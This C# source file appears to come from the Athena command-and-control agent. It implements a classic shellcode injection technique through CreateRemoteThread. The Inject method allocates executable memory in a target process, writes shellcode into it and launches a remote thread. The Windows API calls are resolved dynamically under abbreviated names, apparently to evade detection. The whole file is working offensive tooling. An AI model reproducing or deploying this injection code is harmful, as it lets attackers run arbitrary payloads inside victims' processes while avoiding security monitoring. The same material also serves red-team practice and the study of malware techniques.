using Athena.Commands;
using shellcode_inject;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Athena.Utilities;
namespace shellcode_inject.Techniques
{
    public class CRT : ITechnique
    {
        public CRT()
        {

        }
        DynamicHandler.DynamicVirtAllocEx dlgVrtAllcEx = (DynamicHandler.DynamicVirtAllocEx) DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.VirtAllcEx, typeof(DynamicHandler.DynamicVirtAllocEx));
        DynamicHandler.DynamicWriteProcMeme dlgWriteProcMem = (DynamicHandler.DynamicWriteProcMeme)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WriteProcMem, typeof(DynamicHandler.DynamicWriteProcMeme));
        DynamicHandler.DynamicCreatRemThread dlgCRT = (DynamicHandler.DynamicCreatRemThread)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtRtThrd, typeof(DynamicHandler.DynamicCreatRemThread));
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            // allocate some memory for our shellcode
            IntPtr pAddr = dlgVrtAllcEx(hTarget, IntPtr.Zero, (UInt32)shellcode.Length, DynamicHandler.AllocationType.Commit | DynamicHandler.AllocationType.Reserve, DynamicHandler.MemoryProtection.PAGE_EXECUTE_READWRITE);

            // write the shellcode into the allocated memory
            dlgWriteProcMem(hTarget, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // create the remote thread
            IntPtr hThread = dlgCRT(hTarget, IntPtr.Zero, 0, pAddr, IntPtr.Zero, DynamicHandler.ThreadCreationFlags.NORMAL, out hThread);

            if (hThread == IntPtr.Zero) { return false; }

            return true;
        }
    }
}
